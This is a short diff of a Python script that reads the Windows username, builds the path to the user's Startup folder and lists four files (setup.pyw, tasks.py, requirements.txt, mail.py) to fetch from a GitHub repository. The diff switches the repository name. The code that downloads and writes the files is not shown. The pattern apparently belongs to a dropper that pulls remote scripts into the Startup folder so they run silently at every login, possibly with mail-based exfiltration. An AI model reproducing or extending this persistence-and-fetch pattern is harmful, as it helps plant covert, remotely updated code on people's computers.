@@ -6,10 +6,10 @@ import subprocess
 USERNAME = os.environ['USERNAME']
 PATH = rf"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
-setup = "https://raw.githubusercontent.com/lamer34/lamer_code/master/setup.pyw"
-tasks = "https://raw.githubusercontent.com/lamer34/lamer_code/master/tasks.py"
-reqs = "https://raw.githubusercontent.com/lamer34/lamer_code/master/requirements.txt"
-mail = "https://raw.githubusercontent.com/lamer34/lamer_code/master/mail.py"
+setup = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/setup.pyw"
+tasks = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/tasks.py"
+reqs = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/requirements.txt"
+mail = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/mail.py"
 
 files = [setup, tasks, reqs, mail]
 
